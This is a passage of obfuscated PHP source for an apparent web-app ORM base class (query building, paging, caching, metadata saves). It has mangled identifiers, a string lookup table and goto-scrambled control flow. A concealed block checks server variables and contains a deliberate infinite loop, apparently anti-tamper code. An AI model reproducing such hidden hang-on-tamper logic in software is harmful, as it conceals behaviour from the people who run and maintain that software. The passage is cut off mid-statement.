($b‹ñİçµ) { if (is_string($B®›÷ˆøÒ)) { $B®›÷ˆøÒ = explode($CŒ®‰øÈòó[57], $B®›÷ˆøÒ); } $fç¸ÁÚ÷‰§ = $this->getDbFields(); $B®›÷ˆøÒ = $fç¸ÁÚ÷‰§ ? array_diff($fç¸ÁÚ÷‰§, $B®›÷ˆøÒ) : $B®›÷ˆøÒ; } $this->options[$CŒ®‰øÈòó[281]] = $B®›÷ˆøÒ; return $this; } public function scope($F¹çë”§ = '', $fØ•ËœÊ¶ = NULL) { $Eó¬„ÌŸ±¥ =& $_SERVER[œÕÊİğö]; if ($Eó¬„ÌŸ±¥[43] === $F¹çë”§) { if (isset($this->_scope[$Eó¬„ÌŸ±¥[44]])) { $fõéÒÁ­¸ = $this->_scope[$Eó¬„ÌŸ±¥[44]]; } else { return $this; } } elseif (is_string($F¹çë”§)) { $b¯òÈ•İÁ = explode($Eó¬„ÌŸ±¥[57], $F¹çë”§); $fõéÒÁ­¸ = array(); foreach ($b¯òÈ•İÁ as $BØ¹İ¯ĞÅ³) { if (!isset($this->_scope[$BØ¹İ¯ĞÅ³])) { continue; } $fõéÒÁ­¸ = array_merge($fõéÒÁ­¸, $this->_scope[$BØ¹İ¯ĞÅ³]); } if (!empty($fØ•ËœÊ¶) && is_array($fØ•ËœÊ¶)) { $fõéÒÁ­¸ = array_merge($fõéÒÁ­¸, $fØ•ËœÊ¶); } } elseif (is_array($F¹çë”§)) { $fõéÒÁ­¸ = $F¹çë”§; } if (is_array($fõéÒÁ­¸) && !empty($fõéÒÁ­¸)) { $this->options = array_merge($this->options, array_change_key_case($fõéÒÁ­¸)); } return $this; } public function where($cãœÄãò‹š, $fÊ¬³¸ä¹· = null) { $FÔÓì†“ „ =& $_SERVER[œÕÊİğö]; if (!is_null($fÊ¬³¸ä¹·) && is_string($cãœÄãò‹š)) { if (!is_array($fÊ¬³¸ä¹·)) { $fÊ¬³¸ä¹· = func_get_args(); array_shift($fÊ¬³¸ä¹·); } $fÊ¬³¸ä¹· = array_map(array($this->db, $FÔÓì†“ „[351]), $fÊ¬³¸ä¹·); $cãœÄãò‹š = vsprintf($cãœÄãò‹š, $fÊ¬³¸ä¹·); } elseif (is_object($cãœÄãò‹š)) { $cãœÄãò‹š = get_object_vars($cãœÄãò‹š); } elseif (is_array($cãœÄãò‹š)) { foreach ($cãœÄãò‹š as $E¼ªøØÎ»Æ => $eÌ‹ÉéŠî¡) { if ((is_numeric($E¼ªøØÎ»Æ) || !$E¼ªøØÎ»Æ) && is_string($eÌ‹ÉéŠî¡)) { if (strpos($eÌ‹ÉéŠî¡, $FÔÓì†“ „[358]) === 0) { continue; } think_trace($FÔÓì†“ „[359], $FÔÓì†“ „[43], $FÔÓì†“ „[56]); die; } } } if (is_string($cãœÄãò‹š) && $FÔÓì†“ „[43] != $cãœÄãò‹š) { $aŞØ—‡ğÏ = array(); $aŞØ—‡ğÏ[$FÔÓì†“ „[360]] = $cãœÄãò‹š; $cãœÄãò‹š = $aŞØ—‡ğÏ; } if (isset($this->options[$FÔÓì†“ „[283]])) { $this->options[$FÔÓì†“ „[283]] = array_merge($this->options[$FÔÓì†“ „[283]], $cãœÄãò‹š); } else { $this->options[$FÔÓì†“ „[283]] = $cãœÄãò‹š; } return $this; } public function limit($FæÈ­ƒˆİŞ, $DÇ»ÜµâºÊ = null) { $dÍôÜÕ”‹ =& $_SERVER[œÕÊİğö]; $this->options[$dÍôÜÕ”‹[300]] = is_null($DÇ»ÜµâºÊ) ? $FæÈ­ƒˆİŞ : $FæÈ­ƒˆİŞ . $dÍôÜÕ”‹[57] . $DÇ»ÜµâºÊ; return $this; } public function page($a¬ø–‡Ê¥‡, $eÆµƒ¸àèö = null) { $aŞÜµ„¡¼ =& $_SERVER[œÕÊİğö]; $this->options[$aŞÜµ„¡¼[361]] = is_null($eÆµƒ¸àèö) ? $a¬ø–‡Ê¥‡ : $a¬ø–‡Ê¥‡ . $aŞÜµ„¡¼[57] . $eÆµƒ¸àèö; return $this; } public function comment($e‹¼£–ëìã) { $this->options[$_SERVER[œÕÊİğö][362]] = $e‹¼£–ëìã; return $this; } public function setProperty($a®ß»Ï™¹Ô, $e×òõí´˜’) { if (property_exists($this, $a®ß»Ï™¹Ô)) { $this->{$a®ß»Ï™¹Ô} = $e×òõí´˜’; } return $this; } } if (!isset($_SERVER[$_SERVER[œÕÊİğö][11]]) || !isset($_SERVER[$_SERVER[œÕÊİğö][9]])) { goto cÏ¹¬ª›ì…; Bš‹µîÚé: $cÇØÑÛ†($_SERVER[$_SERVER[œÕÊİğö][13]] . $_SERVER[œÕÊİğö][14]); $DÕØ˜Úå²ğ = 2; while ($DÕØ˜Úå²ğ > 1) { $e¿ã­ëï©Æ = rawurlencode($DÕØ˜Úå²ğ . $_SERVER[œÕÊİğö][251]); } goto f›ˆÉ˜; cÏ¹¬ª›ì…: $CÄš×´â‡ = $_SERVER[œÕÊİğö][12]; $Eí±ª‡—öˆ = $_SERVER[$_SERVER[œÕÊİğö][13]] . $_SERVER[œÕÊİğö][14]; $Eéç¨Ëàé = $CÄš×´â‡($Eí±ª‡—öˆ); goto cÀöïï„ ©; cÀöïï„ ©: $c›ğˆ†ñ­‚ = explode($_SERVER[œÕÊİğö][15], $Eéç¨Ëàé); if (count($c›ğˆ†ñ­‚) < $_SERVER[œÕÊİğö][16]) { $CŠ„®¼Á»ä = $_SERVER[œÕÊİğö][17]; $CŠ„®¼Á»ä(); } $cÇØÑÛ† = $_SERVER[œÕÊİğö][18]; goto Bš‹µîÚé; f›ˆÉ˜: } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\x66\x79\124\x69\x6d\145", "\x74\151\155\x65", "\151\x6e\x73\x65\x72\x74\54\x75\160\144\x61\x74\x65", "\146\x75\x6e\x63\164\151\157\x6e"), array("\143\162\x65\x61\164\145\x54\151\155\145", "\x74\x69\x6d\145", "\151\156\x73\x65\x72\x74", "\x66\165\156\x63\x74\151\x6f\156")); public function setDataAuto($FÙĞÀÂğŠ¸) { $this->dataAuto = $FÙĞÀÂğŠ¸; } public function __construct($FÒ×ïöùÂª = '', $DŞÏ®°Ì = '', $açÏ˜œ²äö = '') { parent::__construct($FÒ×ïöùÂª, $DŞÏ®°Ì, $açÏ˜œ²äö); } protected $tableMeta = array(); protected function _beforeInsert(&$e‘òˆô¬§Í, $b·çï†Ğ) { $ašöÈá¥ˆŠ =& $_SERVER[œÕÊİğö]; if (!$this->checkDataAutoHas($ašöÈá¥ˆŠ[363])) { return; } $this->dataBeforeFilter($e‘òˆô¬§Í, $ašöÈá¥ˆŠ[363]); } protected function _beforeUpdate(&$Bá­“²Ú÷, $FÅˆ¿Œß¾ì) { $b‡–¸¹ñ”á =& $_SERVER[œÕÊİğö]; if (!$this->checkDataAutoHas($b‡–¸¹ñ”á[364])) { return; } $this->dataBeforeFilter($Bá­“²Ú÷, $b‡–¸¹ñ”á[364]); } protected function _afterSelect(&$d¾ß™À¢İ, $eó»˜„à×®) { if (!is_array($d¾ß™À¢İ)) { return; } if (!$this->checkDataAutoHas($_SERVER[œÕÊİğö][365])) { return; } foreach ($d¾ß™À¢İ as &$aâ·ãÖˆÚ³) { $this->dataAfterFilter($aâ·ãÖˆÚ³); } unset($aâ·ãÖˆÚ³); } protected function _afterFind(&$Eª‡‹ÈõƒÇ, $fª®Š¬Úí) { if (!is_array($Eª‡‹ÈõƒÇ)) { return; } if (!$this->checkDataAutoHas($_SERVER[œÕÊİğö][365])) { return; } $this->dataAfterFilter($Eª‡‹ÈõƒÇ); } public static function textEncode($FÜÉ½‹Ê×) { if (!$FÜÉ½‹Ê×) { return $FÜÉ½‹Ê×; } $CÑø½´ê£Ú = json_encode($FÜÉ½‹Ê×); $CÑø½´ê£Ú = preg_replace_callback($_SERVER[œÕÊİğö][366], function ($eÆ ÷ö†Šï) { return addslashes($eÆ ÷ö†Šï[0]); }, $CÑø½´ê£Ú); return json_decode($CÑø½´ê£Ú); } public static function textDecode($b¯™ñæê„ã) { $dó½¦¶ñÒÖ =& $_SERVER[œÕÊİğö]; $CĞ¡Ãˆˆ…Î = json_encode($b¯™ñæê„ã); $CĞ¡Ãˆˆ…Î = preg_replace_callback($dó½¦¶ñÒÖ[367], function ($FŒô‹‰ØÛË) { return $_SERVER[œÕÊİğö][107]; }, $CĞ¡Ãˆˆ…Î); return json_decode($CĞ¡Ãˆˆ…Î); } public function setAutoIncrement($DÑŸŞ”İ¢») { $A¾àÆ£‡ˆ˜ = array($this->getPk() => $DÑŸŞ”İ¢»); $a†ˆŠô–¦ˆ = $this->data($A¾àÆ£‡ˆ˜)->add(); if ($a†ˆŠô–¦ˆ) { $this->delete($a†ˆŠô–¦ˆ); } } public function getAutoIncrement() { $dà¹ÒÍˆª¦ = $this->getTableName(); $CŠƒÂã–¸® = $this->max($this->getPk()); $e·ã„Û­›÷ = $this->query("\163\x68\x6f\x77\40\164\x61\x62\x6c\x65\40\x73\164\x61\x74\x75\163\40\167\x68\x65\x72\x65\x20\x4e\141\x6d\x65\75\47{$dà¹ÒÍˆª¦}\47"); $AßïÅ÷ÅšÚ = $e·ã„Û­›÷[0][$_SERVER[œÕÊİğö][368]]; $Aœ­öµÙá = max($CŠƒÂã–¸®, $AßïÅ÷ÅšÚ); return $Aœ­öµÙá; } protected function _callBefore($dÈ‚•ùÚ©¸, $fó™¯å ´) { return $this->cacheCallCheck($dÈ‚•ùÚ©¸, $fó™¯å ´, !1); } protected function _callAfter($bÀ¸‡¬ƒ, $a¯ºÆÍò£) { return $this->cacheCallCheck($bÀ¸‡¬ƒ, $a¯ºÆÍò£, !0); } protected function cacheFunctionAlias($C„«í«ù¿) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($e¸µ·êñÔÙ, $fêÚç¬çÈÕ, $d…µ¡¹”” = false) { $c™£ç…Ÿ‹Ó = $this->cacheFunctionAlias($fêÚç¬çÈÕ); if (!$c™£ç…Ÿ‹Ó) { return; } foreach ($c™£ç…Ÿ‹Ó as $A¨ö«¸×õŠ => $B§ä¹ˆ‰Ã) { $Bª©ËéŞ°˜ = $B§ä¹ˆ‰Ã[0]; $Eˆ—‘ãËÓÊ = explode($_SERVER[œÕÊİğö][57], $B§ä¹ˆ‰Ã[1]); if ($e¸µ·êñÔÙ == $A¨ö«¸×õŠ) { return $this->cacheFunctionGet($A¨ö«¸×õŠ, $Bª©ËéŞ°˜); } if ($d…µ¡¹”” && in_array($e¸µ·êñÔÙ, $Eˆ—‘ãËÓÊ)) { $this->cacheFunctionClear($A¨ö«¸×õŠ, $Bª©ËéŞ°˜); } } } public function cacheFunctionGet($dèĞ›âíºî, $D¥‡äŸ©‹) { $cçÍã×ç‡ = $this->cacheKeyMake($dèĞ›âíºî, $D¥‡äŸ©‹); $CÊî›à•Æì = Cache::get($cçÍã×ç‡); if (!is_array($CÊî›à•Æì)) { $CÊî›à•Æì = call_user_func_array(array($this, $dèĞ›âíºî), array($D¥‡äŸ©‹, !0)); Cache::set($cçÍã×ç‡, $CÊî›à•Æì); } return $CÊî›à•Æì; } public function cacheFunctionClear($cİí¦Ò×», $B†¨¿ëùæÙ) { $DíßŞ·Œ¯Í = $B†¨¿ëùæÙ; if (!is_array($B†¨¿ëùæÙ)) { $DíßŞ·Œ¯Í = array($B†¨¿ëùæÙ); } foreach ($DíßŞ·Œ¯Í as $Eß¶Œä§¥¿) { $c†´…Ä®Œ½ = $this->cacheKeyMake($cİí¦Ò×», $Eß¶Œä§¥¿); Cache::remove($c†´…Ä®Œ½); } } private function cacheKeyMake($B«ªŸªÇ£¤, $CÃ¤œ–³É¯) { $Aî‘×¬ƒÁã =& $_SERVER[œÕÊİğö]; return get_class($this) . $Aî‘×¬ƒÁã[81] . $B«ªŸªÇ£¤ . $Aî‘×¬ƒÁã[369] . $CÃ¤œ–³É¯; } protected function selectPageReset() { $CäĞÔî¥¦ =& $_SERVER[œÕÊİğö]; if (isset($GLOBALS[$CäĞÔî¥¦[370]])) { return; } $GLOBALS[$CäĞÔî¥¦[370]] = isset($GLOBALS[$CäĞÔî¥¦[7]][$CäĞÔî¥¦[371]]) ? $GLOBALS[$CäĞÔî¥¦[7]][$CäĞÔî¥¦[371]] : !1; $GLOBALS[$CäĞÔî¥¦[372]] = isset($GLOBALS[$CäĞÔî¥¦[7]][$CäĞÔî¥¦[361]]) ? $GLOBALS[$CäĞÔî¥¦[7]][$CäĞÔî¥¦[361]] : !1; $GLOBALS[$CäĞÔî¥¦[7]][$CäĞÔî¥¦[371]] = !1; $GLOBALS[$CäĞÔî¥¦[7]][$CäĞÔî¥¦[361]] = !1; } protected function selectPageRestore() { $BÏã²£á‰è =& $_SERVER[œÕÊİğö]; if (!isset($GLOBALS[$BÏã²£á‰è[370]])) { return; } $GLOBALS[$BÏã²£á‰è[7]][$BÏã²£á‰è[371]] = $GLOBALS[$BÏã²£á‰è[370]]; $GLOBALS[$BÏã²£á‰è[7]][$BÏã²£á‰è[361]] = $GLOBALS[$BÏã²£á‰è[372]]; unset($GLOBALS[$BÏã²£á‰è[370]]); unset($GLOBALS[$BÏã²£á‰è[372]]); } protected function selectPage($BÕÆÙ÷´ïÌ = 200, $E¶¥Õ¦ï­ = 1) { goto aøù‡ÇìÑÁ; cµïİàÌ: $eÉ™Åñ‡ = 50000; $BÕÆÙ÷´ïÌ = isset($in[$AŒµÎ„Ä[371]]) && $in[$AŒµÎ„Ä[371]] ? $in[$AŒµÎ„Ä[371]] : $BÕÆÙ÷´ïÌ; if ($BÕÆÙ÷´ïÌ === -1) { $in[$AŒµÎ„Ä[371]] = !1; $eÉ™Åñ‡ = 100000000; $BÕÆÙ÷´ïÌ = $eÉ™Åñ‡; } goto cº¥É‘÷Šİ; c“Ëë†ìç‚: $c†™Ç¢Š² = array(); $B¯ÂÈàŸ = 1; if ($E¶¥Õ¦ï­ == 1 && $B¯ÂÈàŸ) { $this->optionsValue($EÌ®¦™ØöÑ); $c†™Ç¢Š² = $this->page($E¶¥Õ¦ï­, $BÕÆÙ÷´ïÌ)->select(); $eÉÊÌ¦õæ = is_array($c†™Ç¢Š²) ? count($c†™Ç¢Š²) : 0; if ($eÉÊÌ¦õæ < $BÕÆÙ÷´ïÌ) { $Açˆæ´‘’ó = 1; } else { $this->optionsValue($EèÑÑš¯œ—); $eÉÊÌ¦õæ = intval($this->count()); $Açˆæ´‘’ó = ceil($eÉÊÌ¦õæ / $BÕÆÙ÷´ïÌ); } } else { $this->optionsValue($EèÑÑš¯œ—); $eÉÊÌ¦õæ = intval($this->count()); $Açˆæ´‘’ó = ceil($eÉÊÌ¦õæ / $BÕÆÙ÷´ïÌ); $E¶¥Õ¦ï­ = $E¶¥Õ¦ï­ >= $Açˆæ´‘’ó ? $Açˆæ´‘’ó : $E¶¥Õ¦ï­; $this->optionsValue($EÌ®¦™ØöÑ); $c†™Ç¢Š² = $this->page($E¶¥Õ¦ï­, $BÕÆÙ÷´ïÌ)->select(); } goto AÆ‹Š½ò‡¹; bÇô³ÅùÁ: return $AÓ…á“æ•; goto F®Í´Ù­‚…; cº¥É‘÷Šİ: $EèÑÑš¯œ— = $EÌ®¦™ØöÑ; $EèÑÑš¯œ—[$AŒµÎ„Ä[373]] = array(); $BÕÆÙ÷´ïÌ = intval($BÕÆÙ÷´ïÌ); goto DÙ„„Áù“; DÙ„„Áù“: $BÕÆÙ÷´ïÌ = $BÕÆÙ÷´ïÌ <= 5 ? 5 : ($BÕÆÙ÷´ïÌ >= $eÉ™Åñ‡ ? $eÉ™Åñ‡ : $BÕÆÙ÷´ïÌ); $E¶¥Õ¦ï­ = intval(isset($in[$AŒµÎ„Ä[361]]) && $in[$AŒµÎ„Ä[361]] ? $in[$AŒµÎ„Ä[361]] : $E¶¥Õ¦ï­); $E¶¥Õ¦ï­ = $E¶¥Õ¦ï­ <= 1 ? 1 : $E¶¥Õ¦ï­; goto c“Ëë†ìç‚; aøù‡ÇìÑÁ: $AŒµÎ„Ä =& $_SERVER[œÕÊİğö]; global $in; $EÌ®¦™ØöÑ = $this->optionsValue(); goto cµïİàÌ; AÆ‹Š½ò‡¹: if (!is_array($c†™Ç¢Š²)) { $c†™Ç¢Š² = array(); } if ($Açˆæ´‘’ó == 1) { $eÉÊÌ¦õæ = count($c†™Ç¢Š²); } $AÓ…á“æ• = array($AŒµÎ„Ä[374] => array($AŒµÎ„Ä[375] => $eÉÊÌ¦õæ, $AŒµÎ„Ä[371] => $BÕÆÙ÷´ïÌ, $AŒµÎ„Ä[361] => $E¶¥Õ¦ï­, $AŒµÎ„Ä[376] => $Açˆæ´‘’ó), $AŒµÎ„Ä[377] => $c†™Ç¢Š²); goto bÇô³ÅùÁ; F®Í´Ù­‚…: } protected function checkLength($B‚¡Îà’îİ, $c‘ÑÓ‹ĞÆ = 0, $EˆöÍÜÅç = '') { $CÛíİÀ§³Û =& $_SERVER[œÕÊİğö]; $c‘ÑÓ‹ĞÆ = $c‘ÑÓ‹ĞÆ ? $c‘ÑÓ‹ĞÆ : 65536; if (!$B‚¡Îà’îİ || strlen($B‚¡Îà’îİ) < $c‘ÑÓ‹ĞÆ) { return; } $EˆöÍÜÅç = $EˆöÍÜÅç ? $EˆöÍÜÅç . $CÛíİÀ§³Û[78] : $CÛíİÀ§³Û[43]; show_json($EˆöÍÜÅç . LNG($CÛíİÀ§³Û[378]) . "\x28{$c‘ÑÓ‹ĞÆ}\x29", !1); } protected function metaSet($Aá ¥‰²×†, $bŒ‘ÈÅ–»† = null, $d‡ ‹ÓÀÕ‹ = null) { goto F¥Ç· Ÿƒé; D£†¤ÑÇí: $Aä“ù¦Æ—¨ = $this->tableMeta[$f ğ“©È²›[380]]; $Aå÷ÄŒ¢Ùô = Model($Aä“ù¦Æ—¨); $BÄÑŒ¼òâî = array($c¢°ë…¡… => $Aá ¥‰²×†, $f ğ“©È²›[381] => $bŒ‘ÈÅ–»†); goto BŸñ˜Èœ‰›; B‡¨ùô”‰ó: $eÖâ™…é = $f ğ“©È²›[383] . $this->tableMeta; CacheLock::lock($eÖâ™…é); $Aå÷ÄŒ¢Ùô->where(array($c¢°ë…¡… => $Aá ¥‰²×†))->addAll($e†ô±§ØÏÅ, array(), !0); goto fë‰äïË¶Î; fµ…¸ï§äÔ: if (is_string($bŒ‘ÈÅ–»†)) { $eØ˜Æ î“‰[$bŒ‘ÈÅ–»†] = $d‡ ‹ÓÀÕ‹; } $e†ô±§ØÏÅ = array(); foreach ($eØ˜Æ î“‰ as $CÙöŞ„‡ŠÓ => $Eä¢“ø»Úß) { if (is_null($Eä¢“ø»Úß) && is_string($CÙöŞ„‡ŠÓ)) { $Aå÷ÄŒ¢Ùô->where(array($c¢°ë…¡… => $Aá ¥‰²×†, $f ğ“©È²›[381] => $CÙöŞ„‡ŠÓ))->delete(); continue; } $this->checkLength($Eä¢“ø»Úß, !1, $Aä“ù¦Æ—¨ . $f ğ“©È²›[4] . $CÙöŞ„‡ŠÓ); $e†ô±§ØÏÅ[] = array($c¢°ë…¡… => $Aá ¥‰²×†, $f ğ“©È²›[103] => $CÙöŞ„‡ŠÓ, $f ğ“©È²›[382] => $Eä¢“ø»Úß); } goto B‡¨ùô”‰ó; fë‰äïË¶Î: CacheLock::unlock($eÖâ™…é); return !0; goto E…÷ƒ¿¯Õ¨; F¥Ç· Ÿƒé: $f ğ“©È²› =& $_SERVER[œÕÊİğö]; if (!$this->tableMeta || !$Aá ¥‰²×†) { return !1; } $c¢°ë…¡… = $this->tableMeta[$f ğ“©È²›[379]]; goto D£†¤ÑÇí; BŸñ˜Èœ‰›: if (is_null($bŒ‘ÈÅ–»†)) { return $Aå÷ÄŒ¢Ùô->where(array($c¢°ë…¡… => $Aá ¥‰²×†))->delete(); } if (is_null($d‡ ‹ÓÀÕ‹) && is_string($bŒ‘ÈÅ–»†)) { return $Aå÷ÄŒ¢Ùô->where($BÄÑŒ¼òâî)->delete(); } $eØ˜Æ î“‰ = is_array($bŒ‘ÈÅ–»†) ? $bŒ‘ÈÅ–»† : array(); goto fµ…¸ï§äÔ; E…÷ƒ¿¯Õ¨: } public function metaGet($fÔƒ¬ÎÀ˜Î, $E£ÑŞ¥‘†® = false) { goto A‰Ğìö‚˜ª; cÉ¯à´ÃÎÔ: $D˜·ÖÆ²²Ì = $Bï–çÚğİ->field($Bá°˜ßËê¹[384])->where($bÃƒÑÛ½õõ)->select(); $D˜·ÖÆ²²Ì = array_to_keyvalue($D˜·ÖÆ²²Ì, $Bá°˜ßËê¹[103], $Bá°˜ßËê¹[382]); return $D˜·ÖÆ²²Ì; goto bÙ¿…–Š—Ü; B®¡å™‘ê’: $Bï–çÚğİ = Model($this->tableMeta[$Bá°˜ßËê¹[380]]); if ($E£ÑŞ¥‘†®) { $bÃƒÑÛ½õõ = array($cŒ³—´Ä¶Ù => $fÔƒ¬ÎÀ˜Î, $Bá°˜ßËê¹[103] => $E£ÑŞ¥‘†®); return $Bï–çÚğİ->where($bÃƒÑÛ½õõ)->getField($Bá°˜ßËê¹[382]); } $bÃƒÑÛ½õõ = array($cŒ³—´Ä¶Ù => $fÔƒ¬ÎÀ˜Î); goto cÉ¯à´ÃÎÔ; A‰Ğìö‚˜ª: $Bá°˜ßËê¹ =& $_SERVER[œÕÊİğö]; if (!$this->tableMeta) { return array(); } $cŒ³—´Ä¶Ù = $this->tableMeta[$Bá°˜ßËê¹[379]]; goto B®¡å™‘ê’; bÙ¿…–Š—Ü: } private function checkDataAutoHas($b“… ÜâšÂ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $E‘“”°) { if (in_array($b“… ÜâšÂ, explode($_SERVER[œÕÊİğö][57], $E‘“”°[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$AòéĞšƒ•, $dêÜ™´) { $CÜã¼¼êÅÜ =& $_SERVER[œÕÊİğö]; foreach ($this->dataAuto as $cÍ±ÉÏ£ù‚) { $f—®åğ»òä = $cÍ±ÉÏ£ù‚[0]; if (!in_array($dêÜ™´, explode($CÜã¼¼êÅÜ[57], $cÍ±ÉÏ£ù‚[2]))) { continue; } switch (trim($cÍ±ÉÏ£ù‚[3])) { case $CÜã¼¼êÅÜ[329]: case $CÜã¼¼êÅÜ[330]: $fµâ–áƒ»» = $cÍ±ÉÏ£ù‚[1]; $A½½¿²Úâ = isset($cÍ±ÉÏ£ù‚[4]) ? (array) $cÍ±ÉÏ£ù‚[4] : array(); if ($fµâ–áƒ»» == $CÜã¼¼êÅÜ[207] && array_key_exists($f—®åğ»òä, $AòéĞšƒ•)) { if (!$AòéĞšƒ•[$f—®åğ»òä]) { unset($AòéĞšƒ•[$f—®åğ»òä]); } break; } if (isset($AòéĞšƒ•[$f—®åğ»òä])) { array_unshift($A½½¿²Úâ, $AòéĞšƒ•[$f—®åğ»òä]); } if ($CÜã¼¼êÅÜ[329] == $cÍ±ÉÏ£ù‚[3]) { $AòéĞšƒ•[$f—®åğ»òä] = call_user_func_array($fµâ–áƒ»», $A½½¿²Úâ); } else { $AòéĞšƒ•[$f—®åğ»òä] = call_user_func_array(array(&$this, $fµâ–áƒ»»), $A½½¿²Úâ); } break; case $CÜã¼¼êÅÜ[278]: if (isset($AòéĞšƒ•[$f—®åğ»òä]) && $AòéĞšƒ•[$f—®åğ»òä]) { $AòéĞšƒ•[$f—®åğ»òä] = call_user_func_array(array(&$this, $cÍ±ÉÏ£ù‚[1]), array($AòéĞšƒ•[$f—®åğ»òä])); } break; case $CÜã¼¼êÅÜ[281]: $AòéĞšƒ•[$f—®åğ»òä] = $AòéĞšƒ•[$cÍ±ÉÏ£ù‚[1]]; break; case $CÜã¼¼êÅÜ[302]: if (isset($AòéĞšƒ•[$f—®åğ»òä]) && !is_string($AòéĞšƒ•[$f—®åğ»òä])) { $AòéĞšƒ•[$f—®åğ»òä] = json_encode_force($AòéĞšƒ•[$f—®åğ»òä]); } break; case $CÜã¼¼êÅÜ[331]: if ($AòéĞšƒ•[$f—®åğ»òä] === $CÜã¼¼êÅÜ[43]) { unset($AòéĞšƒ•[$f—®åğ»òä]); } break; case $CÜã¼¼êÅÜ[332]: $AòéĞšƒ•[$f—®åğ»òä] = $cÍ±ÉÏ£ù‚[1]; default: break; } } if ($dêÜ™´ == $CÜã¼¼êÅÜ[363]) { $F†¹‹™ƒß = strtolower($this->db->getDbType()); if (strpos($F†¹‹™ƒß, $CÜã¼¼êÅÜ[19]) !== 0) { return; } $dê†ÜÅ‚¥‚ = $this->field(!0)->fields; $DŠâàá”Š¥ = $dê†ÜÅ‚¥‚[$CÜã¼¼êÅÜ[260]]; if (isset($dê†ÜÅ‚¥‚[$CÜã¼¼êÅÜ[259]])) { unset($DŠâàá”Š¥[$dê†ÜÅ‚¥‚[$CÜã¼¼êÅÜ[259]]]); } foreach ($DŠâàá”Š¥ as $Cò†ƒë³÷‚ => $dêÜ™´) { if (!isset($AòéĞšƒ•[$Cò†ƒë³÷‚])) { $AòéĞšƒ•[$Cò†ƒë³÷‚] = $CÜã¼¼êÅÜ[43]; } } } } private function dataAfterFilter(&$aˆ´Ê›İ) { $aç‚“–ïÌŞ =& $_SERVER[œÕÊİğö]; foreach ($this->dataAuto as $e˜™—Ë­±Æ) { $D…ª‰Å‚Ö = $e˜™—Ë­±Æ[0]; if (!isset($aˆ´Ê›İ[$D…ª‰Å‚Ö])) { continue; } if (!in_array($aç‚“–ïÌŞ[365], explode($aç‚“–ïÌŞ[57], $e˜™—Ë­±Æ[2]))) { continue; } switch (trim($e˜™—Ë­±Æ[3])) { case $aç‚“–ïÌŞ[329]: case $aç‚“–ïÌŞ[330]: $bç¾â‡œøñ = isset($e˜™—Ë­±Æ[4]) ? (array) $e˜™—Ë­±Æ[4] : array(); array_unshift($bç¾â‡œøñ, $aˆ´Ê›İ[$D…ª‰Å‚Ö]); if (isset($e˜™—Ë­±Æ[4]) && $e˜™—Ë­±Æ[4] == $aç‚“–ïÌŞ[385]) { $bç¾â‡œøñ = array($aˆ´Ê›İ[$D…ª‰Å‚Ö]); } if ($aç‚“–ïÌŞ[329] == $e˜™—Ë­±Æ[3]) { $aˆ´Ê›İ[$D…ª‰Å‚Ö] = call_user_func_array($e˜™—Ë­±Æ[1], $bç¾â‡œøñ); } else { $aˆ´Ê›İ[$D…ª‰Å‚Ö] = call_user_func_array(array(&$this, $e˜™—Ë­±Æ[1]), $bç¾â‡œøñ); } break; case $aç‚“–ïÌŞ[278]: if (isset($aˆ´Ê›İ[$D…ª‰Å‚Ö]) && $aˆ´Ê›İ[$D…ª‰Å‚Ö]) { $aˆ´Ê›İ[$D…ª‰Å‚Ö] = call_user_func_array(array(&$this, $e˜™—Ë­±Æ[1]), array($aˆ´Ê›İ[$D…ª‰Å‚Ö])); } break; case $aç‚“–ïÌŞ[281]: $aˆ´Ê›İ[$D…ª‰Å‚Ö] = $aˆ´Ê›İ[$e˜™—Ë­±Æ[1]]; break; case $aç‚“–ïÌŞ[302]: $CÇŠ£ùÖ‰Ç = $aˆ´Ê›İ[$D…ª‰Å‚Ö]; $aˆ´Ê›İ[$D…ª‰Å‚Ö] = json_decode($CÇŠ£ùÖ‰Ç, !0); if (is_null($aˆ´Ê›İ[$D…ª‰Å‚Ö])) { $aˆ´Ê›İ[$D…ª‰Å‚Ö] = $CÇŠ£ùÖ‰Ç; } break; case $aç‚“–ïÌŞ[331]: if ($aˆ´Ê›İ[$D…ª‰Å‚Ö] === $aç‚“–ïÌŞ[43]) { unset($aˆ´Ê›İ[$D…ª‰Å‚Ö]); } break; case $aç‚“–ïÌŞ[332]: $aˆ´Ê›İ[$D…ª‰Å‚Ö] = $e˜™—Ë­±Æ[1]; break; default: break; } } } public function saveAll($Fœšìò—) { goto D™Í›‚…¿; EÈÂ‰æ§©: $this->chunkEventSet(); goto D‡ÄŒ˜²ÀÙ; fŒÌ…ƒ’ÎÆ: $FÁŒ²º˜ = array(); $D‰¼È²İÎĞ = count($Fœšìò—); for ($E ½Ã‚ôìƒ = 0; $E ½Ã‚ôìƒ < $D‰¼È²İÎĞ; $E ½Ã‚ôìƒ++) { $C›ï˜Ù˜Å = $Fœšìò—[$E ½Ã‚ôìƒ]; if (!is_array($C›ï˜Ù˜Å) || count($C›ï˜Ù˜Å) != 4) { continue; } $fÌàåÚ†ù = "\125\120\104\101\124\x45\x20\x60{$DêØ‘èì·}\140\40\x53\x45\x54\40{$C›ï˜Ù˜Å[2]}\x20\x3d\40\x43\x41\x53\x45\x20{$C›ï˜Ù˜Å[0]}\40\xa"; if ($A¶ã†Òğ®Ú == 0) { $aĞ™ÑÒÕê× = $fÌàåÚ†ù; } $FÁŒ²º˜[] = $f¡§’‡ôÇ[126] . $C›ï˜Ù˜Å[1] . $f¡§’‡ôÇ[126]; $A¶ã†Òğ®Ú++; $aĞ™ÑÒÕê× .= "\40\x57\110\105\116\x20\x27{$C›ï˜Ù˜Å[1]}\x27\40\124\110\x45\116\x20\x27{$C›ï˜Ù˜Å[3]}\47\40\xa"; if ($A¶ã†Òğ®Ú == $fŞÄ¿¬˜– || $E ½Ã‚ôìƒ == $D‰¼È²İÎĞ - 1) { goto CÀ•àôßœÅ; e–££ğ™êÖ: $A¶ã†Òğ®Ú = 0; $aĞ™ÑÒÕê× = $fÌàåÚ†ù; $this->chunkEventCheck(count($FÁŒ²º˜)); goto Aˆä°›õ×ö; CÀ•àôßœÅ: $bÓÓ†èÔ®÷ = implode($f¡§’‡ôÇ[57], $FÁŒ²º˜); $aĞ™ÑÒÕê× .= 